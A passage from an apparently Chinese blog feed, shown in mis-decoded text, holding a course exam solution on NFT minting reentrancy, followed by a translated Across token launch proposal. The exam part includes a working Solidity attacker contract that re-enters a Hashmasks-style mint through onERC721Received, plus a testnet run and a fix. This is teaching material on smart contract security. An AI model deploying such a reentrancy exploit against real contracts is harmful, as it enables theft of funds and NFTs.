å‡è®¾ç°åœ¨æ€»ä¾›ç»™çš„ä»·å€¼æ˜¯16370ï¼Œè¯·å†™å‡ºå®æ–½å¯¹ï¼ˆaï¼‰éƒ¨åˆ†è¿›è¡Œæ”»å‡»çš„æ¶æ„Solidityåˆçº¦ä»£ç ã€‚</p><p><strong>ç­”ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attacker is IERC721Receiver &#123;</span><br><span class="line">  Hashmasks hashmasks;</span><br><span class="line"></span><br><span class="line">  constructor(address _hashmasksAddress) &#123;</span><br><span class="line">    hashmasks = Hashmasks(_hashmasksAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() public payable&#123;</span><br><span class="line">    &#123;</span><br><span class="line">      uint256 num = hashmasks.balanceOf(address(this));</span><br><span class="line">      // console.log(&quot;num: &quot;, num);</span><br><span class="line">      if (num &lt; 14) &#123;</span><br><span class="line">        // 16384 - 16370 = 14</span><br><span class="line">        hashmasks.mintNFT&#123;value: 14-num&#125;(14 - num);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function onERC721Received(</span><br><span class="line">    address _from,</span><br><span class="line">    address _to,</span><br><span class="line">    uint256 _tokenId,</span><br><span class="line">    bytes memory _data</span><br><span class="line">  ) external returns (bytes4) &#123;</span><br><span class="line">    attack();</span><br><span class="line">    return msg.sig;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>attack</code> è®¾ç½®ä¸º <em><code>payable</code> æ˜¯å› ä¸ºéœ€è¦é€šè¿‡æ”»å‡»åˆçº¦è°ƒç”¨ mintNFT å‡½æ•°ï¼Œéœ€è¦å‘é€ä¸€å®šæ•°é‡çš„ä»¥å¤ªï¼Œå¯ä»¥é€‰æ‹©åœ¨éƒ¨ç½²åå…ˆå‘é€ä¸€å®šæ•°é‡çš„ä»¥å¤ªåˆ°æ”»å‡»è€…åˆçº¦ä¸­ï¼Œä¹Ÿå¯ä»¥å°† <code>attack</code> è®¾ç½®æˆ <code>payable</code>ï¼Œåœ¨æ”»å‡»çš„äº¤æ˜“ä¸­å‘é€ä»¥å¤ªåˆ°</em></p><p>å®éªŒï¼šåœ¨ Rinkeby ä¸Šéƒ¨ç½²ï¼Œæ”»å‡»è€…åˆçº¦åœ°å€ä¸º 0xf1eb80Bb66A70E44d42B3ceC0bC18Ec28B5F2Ea8ï¼Œå®é™…æ”»å‡»çš„äº¤æ˜“ï¼š<a href="https://rinkeby.etherscan.io/tx/0xb90496fd8789c3d1800df1bd3a571d019fb6158cbd521a9d05e57ad62460d15f">https://rinkeby.etherscan.io/tx/0xb90496fd8789c3d1800df1bd3a571d019fb6158cbd521a9d05e57ad62460d15f</a>ï¼Œè¿™ä¸ªéƒ¨ç½²çš„åˆçº¦ä¸­ï¼ŒNFTçš„ä»·æ ¼è®¾ç½®ä¸º 1 weiï¼Œæ‰€ä»¥ç†è®ºä¸Šåªè¦å‘é€ 105 wei åˆ°æ”»å‡»è¿™åˆçº¦ä¸­ï¼Œä½†æ˜¯ä¿é™©èµ·è§ï¼Œå‘é€äº†150weiï¼Œæœ€åä¹Ÿå¯ä»¥çœ‹åˆ°æ”»å‡»è¿™åˆçº¦ä¸­è¿˜å‰©ä¸‹ 45 weiã€‚</p><p><strong>C)</strong>Â Â Â  ä½ ä¼šåœ¨å‰ä¸€é¡µçš„ä»£ç ä¸­æ·»åŠ æˆ–æ›´æ”¹å“ªä¸€è¡ŒSolidityæ¥é˜²æ­¢ä½ çš„æ”»å‡»?è¯·æ³¨æ„ï¼Œå•ä¸ªäº¤æ˜“ä¸åº”è¯¥é“¸é€ è¶…è¿‡20ä¸ªNFTã€‚</p><p><strong>ç­”ï¼š</strong> å¯ä»¥å°† <code>_safeMint</code> æ–¹æ³•ä¸­ï¼Œ <code>_totalSupply++;</code> è¿™ä¸€è¡Œæ”¾åˆ°éªŒè¯ NFT çš„è°ƒç”¨ä¹‹åï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function _safeMint(address to, uint256 tokenId) internal virtual override &#123;</span><br><span class="line">   // Mint one NFT and assign it to address(to).</span><br><span class="line">   require(!_exists(tokenId), &#x27;ERC721: token already minted&#x27;);</span><br><span class="line">   _data = _mint(to, tokenId); // mint NFT and assign it to address to</span><br><span class="line">   </span><br><span class="line">   if (to.isContract()) &#123;</span><br><span class="line">     // Confirm that NFT was recorded properly by calling</span><br><span class="line">     // the function onERC721Received() at address(to).</span><br><span class="line">     // The arguments to the function are not important here.</span><br><span class="line">     // If onERC721Received is implemented correctly at address(to) then</span><br><span class="line">     // the function returns _ERC721_RECEIVED if all is well.</span><br><span class="line">     bytes4 memory retval = IERC721Receiver(to).onERC721Received(to, address(0), tokenId, _data);</span><br><span class="line">     require(retval == _ERC721_RECEIVED, &#x27;NFT Rejected by receiver&#x27;);</span><br><span class="line">   &#125;</span><br><span class="line">_totalSupply++; // increment totalSupply() by one</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œå½“åˆçº¦è¢«é‡å…¥æ”»å‡»æ—¶ï¼Œç”±äº <code>_totalSupply</code> è¿˜æ²¡æœ‰å¢åŠ ï¼Œå› æ­¤åœ¨ç¬¬äºŒæ¬¡è¿›å…¥ <code>mintNFT</code> å‡½æ•°æ—¶ <code>mintIndex</code> çš„å€¼æ˜¯ç¬¬ä¸€æ¬¡ mint çš„å€¼ï¼Œä¼šå¯¼è‡´è§¦å‘ <code>'ERC721: token already minted'</code> è¿™ä¸ªé”™è¯¯ï¼Œæœ‰æ•ˆä¿è¯åˆçº¦å®‰å…¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (uint256 i = 0; i &lt; numberOfNfts; i++) &#123;</span><br><span class="line">  uint256 mintIndex = totalSupply(); // get number of NFTs issued so far</span><br><span class="line">  _safeMint(msg.sender, mintIndex); // mint the next one</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éªŒè¯äº¤æ˜“ï¼š <a href="https://rinkeby.etherscan.io/tx/0xa5f70a226c5fd64132eee800f8902ddb9b4ff562ff7f37820d11746fbde52acb">https://rinkeby.etherscan.io/tx/0xa5f70a226c5fd64132eee800f8902ddb9b4ff562ff7f37820d11746fbde52acb</a></p><p>æ„Ÿè°¢ discord <strong>yyczz#5837</strong> å¯¹äºè¿™ä¸ªé—®é¢˜çš„æŒ‡å¯¼ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CS251 - final 2021 - é—®é¢˜ 4
    
    </summary>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Across ä»£å¸å‘å¸ƒææ¡ˆ v2</title>
    <link href="https://qiwihui.com/qiwihui-blog-160/"/>
    <id>https://qiwihui.com/qiwihui-blog-160/</id>
    <published>2024-05-15T02:25:31.378Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="across-dai-bi-fa-bu-ti-an-v2">Across ä»£å¸å‘å¸ƒææ¡ˆ v2</span></h1><p>è¿™æ˜¯ä¸€ä¸ªä¿®è®¢åçš„ææ¡ˆï¼Œå®ƒå»ºç«‹åœ¨<a href="https://forum.across.to/t/across-token-launch-proposal/195">æœ€åˆçš„ Across ä»£å¸å‘å¸ƒææ¡ˆ</a>çš„åŸºç¡€ä¸Šï¼Œå¢åŠ äº†ç¤¾åŒºåé¦ˆå’Œå®æ–½ç»†èŠ‚ã€‚</p><p>Across ä»£å¸çš„æ¨å‡ºå°†å‘å±•å’Œå›¢ç»“ Across ç¤¾åŒºï¼Œæ¿€åŠ±æµåŠ¨æ€§æä¾›è€…ï¼Œæé«˜ Across çš„çŸ¥ååº¦ï¼Œå¹¶è¿›ä¸€æ­¥å®ç°æˆä¸ºæœ€å¿«å’Œæœ€ä¾¿å®œçš„ L2 æ¡¥çš„ä½¿å‘½ã€‚ è¯¥ææ¡ˆæ¦‚è¿°äº†ä»£å¸å‘å¸ƒè®¡åˆ’ï¼Œå¤§è‡´å¯åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p><ol><li>åˆå§‹åˆ†é…ï¼ˆInitial Distributionï¼‰â”€â”€ å¤šæ ·åŒ–çš„ç©ºæŠ•å’Œå›½åº“ä»£å¸äº¤æ¢</li><li>å¥–åŠ±é”å®šæ¿€åŠ±è®¡åˆ’ï¼ˆReward Locking Incentive Programï¼‰ â”€â”€ ä¸€ç§æ–°é¢–çš„å¥–åŠ±è®¡åˆ’ï¼Œç”¨äºæ¿€åŠ±æ”¯æŒ Across åè®®çš„è¡Œä¸º</li></ol><h2><span id="di-yi-bu-fen-chu-shi-fen-pei">ç¬¬ä¸€éƒ¨åˆ†ã€åˆå§‹åˆ†é…</span></h2><p>å°†é“¸é€  <strong>1,000,000,000 ($ACX)</strong> Across ä»£å¸ ã€‚ 700,000,000 $ACX å°†ä¿ç•™åœ¨ Across DAO å›½åº“ä¸­ï¼Œä¸€éƒ¨åˆ†å°†ä¿ç•™ç”¨äºæ¿€åŠ±å¥–åŠ±ã€‚ 300,000,000 $ACX å°†ä½œä¸ºåˆå§‹ä¾›åº”ï¼Œå¹¶æŒ‰ä»¥ä¸‹æ–¹å¼åˆ†é…ï¼š</p><p><strong>$ACX ç©ºæŠ•</strong> â”€â”€ æ€»å…± <strong>100,000,000 $ACX</strong> å°†å¥–åŠ±ç»™ä»¥ä¸‹å›¢ä½“ï¼š</p><ol><li>10%ï¼šæ‹¥æœ‰â€œè”åˆåˆ›å§‹äººï¼ˆCo-founderï¼‰â€æˆ–â€œæ—©æœŸæ‹›å‹Ÿï¼ˆEarly Recruitï¼‰â€çš„ç¤¾åŒº Discord æˆå‘˜</li><li>10%ï¼šæ‹¥æœ‰â€œDAO è´¡çŒ®è€…ï¼ˆDAO Contributorï¼‰â€æˆ–â€œé«˜çº§ DAO è´¡çŒ®è€…ï¼ˆSenior DAO Contributorï¼‰â€çš„ç¤¾åŒº Discord æˆå‘˜</li><li>20%ï¼šä»£å¸å°†ä½œä¸ºé¢å¤–å¥–åŠ±ä¿ç•™ç»™ Across ç¤¾åŒºçš„é‡è¦æ—©æœŸè´¡çŒ®è€…ï¼Œå…¶ä¸­å¯èƒ½åŒ…æ‹¬ DAO è´¡çŒ®è€…ã€é«˜çº§ DAO è´¡çŒ®è€…å’Œå¼€å‘è€…æ”¯æŒå›¢é˜Ÿã€‚ä»£å¸å‘å¸ƒåï¼Œç¤¾åŒºå°†æœ‰æœºä¼šæäº¤å…³äºå¦‚ä½•åˆ†é…çš„ææ¡ˆï¼Œ$ACX æŒæœ‰è€…å°†é€šè¿‡å¿«ç…§è¿›è¡ŒæŠ•ç¥¨ã€‚</li><li>10%ï¼šåœ¨ 2022 å¹´ 3 æœˆ 11 æ—¥ä¹‹å‰æ¡¥æ¥èµ„äº§çš„æ—©æœŸ Across åè®®ç”¨æˆ·ã€‚è¿™äº›ä»£å¸å°†æ ¹æ®å®Œæˆçš„è½¬è´¦é‡æŒ‰æ¯”ä¾‹åˆ†é…ç»™é’±åŒ…ã€‚å°†è°ƒæ•´è¿™äº›æ•°å­—ä»¥è¿‡æ»¤æ‰å¯èƒ½æ¥è‡ªç©ºæŠ•å†œæ°‘çš„å°é¢è½¬è´¦ã€‚</li><li>50%ï¼šåœ¨ä»£å¸å‘å¸ƒä¹‹å‰å°† ETHã€USDCã€WBTC å’Œ DAI æ±‡é›†åˆ° Across åè®®ä¸­çš„æµåŠ¨æ€§æä¾›è€…ã€‚å¯¹ LP çš„å¥–åŠ±æ•°é‡æŒ‰è§„æ¨¡æŒ‰æ¯”ä¾‹åˆ†é…ï¼Œå¹¶ä¸”è‡ªåè®®å¼€å§‹ä»¥æ¥ï¼Œæ¯ä¸ªåŒºå—éƒ½ä¼šå‘å‡ºå›ºå®šæ•°é‡çš„ä»£å¸ã€‚</li></ol><ul><li>*æƒé‡å’Œç¡®åˆ‡ç»†èŠ‚éƒ½å¯èƒ½å‘ç”Ÿå˜åŒ–ï¼Œå¹¶å–å†³äºä»£å¸å‘å¸ƒå‰æ”¶é›†çš„æ•°æ®ã€‚*</li></ul><p><strong>$UMA çš„ä»£å¸äº¤æ¢ â”€â”€ 100,000,000 $ACX</strong> å°†ä¸ Risk Labs Treasury äº¤æ¢ä»·å€¼ 5,000,000 ç¾å…ƒçš„ $UMAã€‚ è¿™å®ç°äº†ä¸¤ä¸ªç›®æ ‡ â”€â”€ å®ƒèµ‹äºˆ UMA ä¸­çš„ Across ç¤¾åŒºæ‰€æœ‰æƒå’Œæ²»ç†æƒï¼Œè¿™å¯¹æ¡¥çš„å®‰å…¨æ€§è‡³å…³é‡è¦ï¼Œå¹¶ä¸”å®ƒè¿˜æä¾›æŠ•ç¥¨å¥–åŠ±ä½œä¸º Across DAO å›½åº“çš„æ”¶å…¥æ¥æºã€‚ Risk Labs æ¨å‡ºäº† Acrossï¼Œå¹¶å°†åœ¨å¯é¢„è§çš„æœªæ¥ç»§ç»­æ”¯æŒåè®®å’Œç¤¾åŒºã€‚ å‘ Risk Labs æä¾› $ACX å°†è¿›ä¸€æ­¥æ¿€åŠ± Risk Labs å›¢é˜Ÿã€‚ Risk Labs å¯èƒ½ä¼šè€ƒè™‘ä½¿ç”¨è¿™äº›ä»£å¸æ¥å»ºç«‹å’Œæ‰©å±•ä¸€ä¸ªä¸“é—¨çš„å¼€å‘å›¢é˜Ÿï¼Œä»¥å¸®åŠ©æä¾› $ACX çš„æµåŠ¨æ€§ï¼Œå¹¶å‚ä¸æ²»ç†ã€‚ æ— è®ºç”¨é€”å¦‚ä½•ï¼Œè¿™äº›ä»£å¸åªä¼šç”¨äºåè®®çš„åˆ©ç›Šã€‚</p><p><strong>æˆ˜ç•¥åˆä½œä¼™ä¼´å’Œä¸­ç»§è€…èµ„æœ¬ â”€â”€ 100,000,000 $ACX</strong> å°†è½¬ç§»åˆ° Risk Labs Treasuryï¼Œä»¥ç­¹é›†èµ„é‡‘å¹¶ä» DeFi è¡Œä¸šçš„ä¸»è¦å‚ä¸è€…é‚£é‡Œè·å¾—è´·æ¬¾ã€‚ è·¨é“¾æ¡¥é¢†åŸŸçš„ç«äº‰å¯¹æ‰‹æ­£åœ¨ä¸å¤§å‹æœºæ„åˆä½œï¼Œå¹¶è·å¾—å¤§é‡èµ„æºæ¥æ¨åŠ¨å…¶å‘å±•ã€‚ Risk Labs å¯ä»¥ä½¿ç”¨è¿™äº›ä»£å¸æ¥å¸®åŠ© Across åè®®åšåŒæ ·çš„äº‹æƒ…ã€‚ ä¸€ä¸ªå…³é”®çš„èµ„æºé™åˆ¶æ˜¯ä¸­ç»§è€…ç½‘ç»œï¼Œå…¶ä¸­å¤§é‡èµ„é‡‘ç”± Risk Labs çš„å›½åº“æä¾›ã€‚ ä¸èµ„æœ¬å……è¶³çš„å¤§å‹åŠ å¯†è´§å¸ç©å®¶åˆä½œæœ‰åŠ©äºç¼“è§£è¿™ä¸€ç“¶é¢ˆå¹¶åŠ é€Ÿå¢é•¿ã€‚ ä¸ºå®ç°è¿™ä¸€ç›®æ ‡ï¼ŒRisk Labs å¯èƒ½ä¼šä½¿ç”¨è¿™äº› $ACX ä»£å¸æ¥ç­¹é›†æˆåŠŸä»£å¸ï¼ˆ<a href="https://umaproject.org/products/success-tokens">success token</a>ï¼‰èµ„é‡‘ï¼Œåœ¨é€šè¿‡åŒºé—´ä»£å¸ï¼ˆ<a href="https://umaproject.org/products/range-tokens">range tokens</a>ï¼‰å€Ÿæ¬¾æ—¶ç”¨ä½œæŠµæŠ¼ï¼Œä»¥åŠç”¨äºå¥–åŠ±ä»¥ä¿ƒè¿›ä¸­ç»§è€…ç½‘ç»œçš„å»ä¸­å¿ƒåŒ–ã€‚</p><h2><span id="di-er-bu-fen-across-jiang-li-suo-ding-ji-li-ji-hua">ç¬¬äºŒéƒ¨åˆ†ã€Across å¥–åŠ±é”å®šæ¿€åŠ±è®¡åˆ’</span></h2><p>700,000,000 $ACX å‚¨å¤‡çš„å¾ˆå¤§ä¸€éƒ¨åˆ†å°†é€šè¿‡æ­¤æ¿€åŠ±è®¡åˆ’å‘æ”¾ï¼Œç¤¾åŒºæˆå‘˜å¯ä»¥é€šè¿‡æ‰§è¡Œä»¥ä¸‹ä»»ä½•æ“ä½œæ¥èµšå– $ACXï¼š</p><ol><li>è´¨æŠ¼æ¥è‡ªæ¡¥æ¥æ± çš„ Across LP ä»½é¢ â”€â”€ WETH å’Œ USDC æ± å°†æ˜¯ç¬¬ä¸€ä¸ªå—åˆ°æ¿€åŠ±çš„ Across æ± </li><li>ä»æŒ‡å®šçš„ $ACX/ETH æ± ä¸­è´¨æŠ¼ $ACX LP ä»½é¢</li><li>é€šè¿‡ Across æ¨èè®¡åˆ’ï¼ˆAcross Referral Programï¼‰æ¨èç”¨æˆ·</li></ol><p><strong>æµåŠ¨æ€§æä¾›è€…ï¼ˆLPï¼‰</strong> â”€â”€ å¥–åŠ±é”å®šæ˜¯ä¼ ç»ŸæµåŠ¨æ€§æŒ–çŸ¿çš„å¢å¼ºç‰ˆæœ¬ï¼Œå®ƒé˜»æ­¢è€•ç§ï¼ˆfarmï¼‰å’ŒæŠ›å”®æ´»åŠ¨ï¼ŒåŒæ—¶å¥–åŠ±åè®®çš„å¿ å®è´¡çŒ®è€…ã€‚æµåŠ¨æ€§æä¾›è€… (LP) æœ‰ä¸€ä¸ªä»–ä»¬è·å¾—å¥–åŠ±çš„ä¸ªæ€§åŒ–åˆ©ç‡ã€‚ LP ä¿æŒæœªæå–ï¼ˆå’Œæœªå”®å‡ºï¼‰ç´¯ç§¯å¥–åŠ±çš„æ—¶é—´è¶Šé•¿ï¼ŒLP è·å¾—é¢å¤–å¥–åŠ±çš„é€Ÿåº¦å°±è¶Šå¿«ã€‚</p><p>æ¯ä¸ªå—æ¿€åŠ±çš„æµåŠ¨æ€§æ± å°†æœ‰ä¸€ä¸ªåŸºæœ¬çš„å‘æ”¾ç‡ï¼Œæ¯ä¸ª LP å°†æœ‰ä¸€ä¸ªé’ˆå¯¹æ¯ä¸ªæ± çš„ç‹¬ç‰¹æ”¶ç›Šå¢å€¼ç‡ï¼ˆmultiplierï¼‰ã€‚ LP å°†æŒ‰æ¯”ä¾‹è·å¾—åŸºå‡†å‘æ”¾é‡ä¹˜ä»¥ LP çš„ç‹¬ç‰¹æ”¶ç›Šå¢å€¼ç‡çš„ä»½é¢ã€‚ LP çš„æ”¶ç›Šå¢å€¼ç‡ä»ç¬¬ 0 å¤©çš„ 1 å¼€å§‹ï¼Œå½“å¥–åŠ±æœªæå– 100 å¤©æ—¶å¯ä»¥çº¿æ€§å¢é•¿åˆ°æœ€å¤§å€¼ 3ã€‚ä¸‹è¡¨è¯´æ˜äº†è¿™ä¸ªç®€å•çš„è¿‡ç¨‹ã€‚ä¾‹å¦‚ï¼ŒæŒæœ‰ 60 å¤©æœªé¢†å–çš„å¥–åŠ±çš„ LP çš„æ”¶ç›Šå¢å€¼ç‡ä¸º 2.2ã€‚ä¸€æ—¦ LP é¢†å–ä»»ä½•å¥–åŠ±ï¼Œæ”¶ç›Šå¢å€¼ç‡ç«‹å³é‡ç½®ä¸º 1ï¼ŒLP å°†éœ€è¦é‡èµšå–è¯¥ä¹˜æ•°ã€‚</p><table><thead><tr><th>æŒæœ‰å¤©æ•°</th><th>æ”¶ç›Šå¢å€¼ç‡</th></tr></thead><tbody><tr><td>0</td><td>1.0</td></tr><tr><td>25</td><td>1.5</td></tr><tr><td>50</td><td>2.0</td></tr><tr><td>75</td><td>2.5</td></tr><tr><td>100</td><td>3.0</td></tr></tbody></table><p>æœ€åˆçš„å¥–åŠ±é”å®šè®¡åˆ’é¢„è®¡å°†è¿è¡Œ 6 ä¸ªæœˆï¼Œå±Šæ—¶å°†åŠæ—¶å®¡æŸ¥æ˜¯å¦æœ‰ä»»ä½•æ›´æ”¹ã€‚ è¯¥è®¡åˆ’å°†ä»ä»¥ä¸‹åŸºæœ¬å‘æ”¾ç‡å¼€å§‹ï¼š</p><ul><li>Across ETH LP ä»½é¢æ¯å¤©çº¦ 100,000 $ACX</li><li>Across USDC LP ä»½é¢æ¯å¤©çº¦ 100,000 $ACX</li><li>æŒ‡å®š $ACX/$ETH LP ä»½é¢æ¯å¤©çº¦ 20,000 $ACX</li></ul><p>è¿™ç›¸å½“äºå¤§çº¦ 4MM åˆ° 10MM $ACXï¼Œå…·ä½“å–å†³äº LP çš„è¡Œä¸ºã€‚ $ACX æŒæœ‰è€…å¯ä»¥éšæ—¶æè®®å¹¶æŠ•ç¥¨æ·»åŠ æ–°èµ„äº§æˆ–æ›´æ”¹è¿™äº›å‚æ•°ã€‚</p><p><strong>Across æ¨èè®¡åˆ’</strong> â”€â”€ æ¨èè®¡åˆ’å°† Across ç¤¾åŒºè½¬å˜ä¸ºé”€å”®é˜Ÿä¼ã€‚è¦å‚ä¸æ¨èè®¡åˆ’ï¼ŒAcross æ”¯æŒè€…å¯ä»¥è¾“å…¥ä»–ä»¬çš„é’±åŒ…åœ°å€ä»¥ç”Ÿæˆå”¯ä¸€çš„æ¨èé“¾æ¥ã€‚å•å‡»è¯¥é“¾æ¥å¹¶åœ¨ Across ä¸Šå®Œæˆæ¡¥æ¥è½¬ç§»çš„ç”¨æˆ·ä¼šå°† $ACX å¥–åŠ±åˆ†é…ç»™æ¨èäººã€‚é¼“åŠ±æ”¯æŒè€…ä¸æœ‹å‹åˆ†äº«ä»–ä»¬çš„é“¾æ¥ï¼Œå¹¶åœ¨ Twitter ç­‰ç¤¾äº¤åª’ä½“ä¸Šå®£ä¼  Acrossã€‚è¿™ä¹Ÿå¯ä»¥ç”¨äºä¸å…¶ä»–é¡¹ç›®çš„é›†æˆã€‚è·¨é“¾èšåˆå™¨æˆ– DEX å¯ä»¥åˆ›å»ºæ¨èé“¾æ¥ä»¥å°† Across è¿æ¥åˆ°ä»–ä»¬çš„ dAppã€‚å•å‡»è¯¥é“¾æ¥å¹¶å®Œè·¨é“¾è½¬ç§»åï¼Œå¥–åŠ±å°†åˆ†é…ç»™è¯¥é¡¹ç›®ã€‚è¯¥é’±åŒ…æ‰€æœ‰çš„æœªæ¥è½¬è´¦å°†ç»§ç»­å‘æ¨èäººå‘æ”¾å¥–åŠ±ï¼Œé™¤éé’±åŒ…ç”¨æˆ·ç‚¹å‡»ä¸åŒçš„æ¨èé“¾æ¥æˆ–æ¨èäººé¢†å–äº†ä»–ä»¬çš„å¥–åŠ±ã€‚</p><p>ä¸ LP çš„å¥–åŠ±é”å®šç±»ä¼¼ï¼Œæ¨èäººå¯ä»¥é€šè¿‡ä¿æŒå¥–åŠ±æœªè®¤é¢†å¹¶è¾¾åˆ°ç‰¹å®šæ•°é‡çš„æ¨èæˆ–ç¡®ä¿ä¸€å®šæ•°é‡çš„æ•°é‡æ¥æé«˜ä»–ä»¬èµšå–æ¨èè´¹çš„æ¯”ç‡ã€‚æ¨èè´¹æ˜¯åœ¨ $ACX ä¸­æˆäºˆæ¨èäººçš„è·¨é“¾ LP è´¹ç”¨çš„ç™¾åˆ†æ¯”ã€‚å¦‚æœæ²¡æœ‰é¢†å–å¥–åŠ±å¹¶ä¸”å®Œæˆäº†ä¸€å®šæ•°é‡çš„æ¨èæˆ–äº¤æ˜“é‡ï¼Œé‚£ä¹ˆæ¨èè´¹å°±ä¼šä¸Šæ¶¨ã€‚æ¨èäººåˆ†ä¸ºäº”å±‚ï¼š</p><ul><li>é“œï¼ˆCopperï¼‰ï¼š40% çš„æ¨èè´¹ã€‚</li><li>é’é“œï¼ˆBronzeï¼‰ï¼š50% æ¨èè´¹ã€‚é“œæ¨èäººåœ¨ 3 æ¬¡æ¨èæˆ–è·¨é“¾äº¤æ˜“é‡è¶…è¿‡ 5 ä¸‡ç¾å…ƒåæ™‹å‡ä¸ºé’é“œ</li><li>ç™½é“¶ï¼ˆSilverï¼‰ï¼š60% çš„æ¨èè´¹ã€‚é’é“œæ¨èäººåœ¨ 5 æ¬¡æ¨èæˆ–è·¨é“¾äº¤æ˜“é‡è¶…è¿‡ 10 ä¸‡ç¾å…ƒåæ™‹å‡ä¸ºç™½é“¶</li><li>é»„é‡‘ï¼ˆGoldï¼‰ï¼š70% çš„æ¨èè´¹ã€‚ç™½é“¶æ¨èäººåœ¨ 10 æ¬¡æ¨èæˆ–è¶…è¿‡ 25 ä¸‡ç¾å…ƒçš„è·¨é“¾äº¤æ˜“é‡åå‡çº§ä¸ºé»„é‡‘ã€‚</li><li>ç™½é‡‘ï¼ˆPlatinumï¼‰ï¼š80% çš„æ¨èè´¹ã€‚é»„é‡‘æ¨èäººåœ¨ 20 æ¬¡æ¨èæˆ–è¶…è¿‡ 50 ä¸‡ç¾å…ƒçš„è·¨é“¾äº¤æ˜“é‡åå‡çº§ä¸ºç™½é‡‘ã€‚</li></ul><p>æ¨èå¥–åŠ±æ¯å‘¨åˆ†é…ä¸€æ¬¡ï¼Œæ¨èäººæ¯å‘¨åªèƒ½å¢åŠ ä¸€ä¸ªç­‰çº§ã€‚ä¸€æ—¦æ¨èäººé¢†å–å¥–åŠ±ï¼Œæ¨èäººçš„ç­‰çº§ç«‹å³é‡ç½®å›é“œï¼Œå¹¶ä¸”æ‰€æœ‰æ¨èé“¾æ¥éƒ½å¤±æ•ˆã€‚è¿™æ„å‘³ç€æ¨èäººéœ€è¦è®©ç”¨æˆ·å†æ¬¡ç‚¹å‡»ä»–ä»¬çš„æ¨èé“¾æ¥æ‰èƒ½ç»§ç»­èµšå–æ¨èè´¹ï¼Œå¹¶ä¸”æ¨èäººéœ€è¦é‡æ–°è·å¾—ä»–ä»¬çš„ç­‰çº§ï¼Œè¿™éœ€è¦è‡³å°‘ 5 å‘¨çš„æ—¶é—´æ‰èƒ½è¾¾åˆ°ç™½é‡‘çº§åˆ«ã€‚</p><p><strong>å¥–åŠ±é”å®š = DeFi çš„æ¸¸æˆåŒ–</strong></p><p>å¥–åŠ±é”å®šçš„å¥½å¤„æ˜¯æ˜¾è€Œæ˜“è§çš„ã€‚ä¿æŒå¥–åŠ±é”å®šä¸é¼“åŠ±è€•ç§å’ŒæŠ›å”®æ´»åŠ¨ï¼Œä½†æ›´é‡è¦çš„æ˜¯ï¼Œå®ƒä½¿ LP å’Œæ¨èäººä¸åè®®æ›´åŠ ç´§å¯†ã€‚å¦‚æœæ‚¨è¢«é¼“åŠ±å‚ä¸è¯¥åè®®ï¼Œæ‚¨è‡ªç„¶ä¼šæƒ³äº†è§£æ›´å¤šæœ‰å…³å®ƒçš„ä¿¡æ¯ï¼Œå¹¶ä¸”æ‚¨ä¼šè¢«æ¿€åŠ±åŠ å…¥ç¤¾åŒºå¹¶è¿›ä¸€æ­¥å±¥è¡Œå…¶ä½¿å‘½ã€‚</p><p>é‰´äºæ‚¨å¯ä»¥ä¸ºæ¯ä¸ªæµåŠ¨æ€§æ± èµšå–çš„å„ç§ç‹¬ç‰¹æ”¶ç›Šå¢å€¼ç‡ï¼Œä»¥åŠæ‚¨ä½œä¸ºæ¨èäººå¯ä»¥è·å¾—çš„ä¸åŒå±‚çº§ï¼Œä¸ºåè®®åšå‡ºè´¡çŒ®çš„æ¯ä¸ªé’±åŒ…éƒ½å°†å‘å±•å‡ºä¸€ä¸ªä¸ªæ€§åŒ–çš„èº«ä»½ã€‚ç±»ä¼¼äºè§’è‰²æ‰®æ¼”æ¸¸æˆä¸­çš„è§’è‰²ï¼Œå„ç§ç»Ÿè®¡æ•°æ®å¯ä»¥è½¬åŒ–ä¸ºç»éªŒå€¼ï¼Œä½¿é’±åŒ…å¯ä»¥å‡çº§å¹¶è·å¾—åè®®ä¸­çš„çŠ¶æ€ã€‚</p><p>å¥–åŠ±é”å®šå¯ä»¥é€šè¿‡ç²¾å¿ƒæ¶‰åŠçš„ç”¨æˆ·ç•Œé¢å’Œç”¨æˆ·ä½“éªŒè¿›ä¸€æ­¥æ¸¸æˆåŒ–ï¼Œä½¿å…¶çœ‹èµ·æ¥åƒä¸€ä¸ªçœŸæ­£çš„æ¸¸æˆã€‚å®ƒå¯ä»¥åƒ RPG ä¸€æ ·æ„å»ºï¼Œç”¨æˆ·å¯ä»¥åœ¨è¾¾åˆ°æŸäº›é‡Œç¨‹ç¢‘æ—¶è·å¾—ç‰¹æ®Šçš„ NFT æˆ–ç‰©å“ã€‚ç¤¾åŒºæˆå‘˜å¯ä»¥æ„å»ºè¿™ä¸ªå’Œ/æˆ–ä½¿ç”¨è¿™äº›ç»Ÿè®¡æ•°æ®çš„å®é™…æ¸¸æˆå¹¶ç›¸äº’è¿›è¡Œæˆ˜æ–—ã€‚åŒæ ·ï¼Œæ’è¡Œæ¦œå¯ä»¥è¯†åˆ«æ‰€æœ‰å¿ è¯šçš„ Across ç”¨æˆ·çš„æˆå°±ã€‚è¿™ä¸€åˆ‡éƒ½ä¼šä½¿ç”¨æˆ·éå¸¸ä¸æ„¿æ„é¢†å–ä»–ä»¬çš„å¥–åŠ±å¹¶é™ä½èº«ä»½ã€‚</p><p><strong>è´¨æŠ¼ $ACX</strong> â”€â”€ éšç€åè®®çš„æˆç†Ÿï¼Œç¤¾åŒºå¯ä»¥è€ƒè™‘ä¸º $ACX 